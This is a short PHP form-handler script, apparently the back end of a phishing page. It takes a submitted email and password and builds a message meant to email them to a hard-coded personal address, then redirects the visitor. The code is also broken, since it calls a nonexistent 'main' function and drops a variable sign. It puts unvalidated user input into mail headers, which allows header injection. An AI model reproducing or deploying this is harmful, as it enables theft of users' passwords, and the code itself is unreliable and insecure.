<?php
$visitor_email = $_POST['email'];
$subject = $_POST['password'];
$message = $_POST['message'];

$email_from = 'goswamirahul556454@gmail.com';

$email_subject = 'New Form Submission';

$email_body = "User Email: $visitor_email.\n" .
    "Subject: $subject.\n" .
    "User Message: message.\n";

$to = 'goswamirahul5564541@gmail.com';

$headers = "From: $email_from \r\n";

$headers .= "Reply-To: $visitor_email \r\n";


main($to, $email_subject, $email_body, $headers);

header("Location: index.html");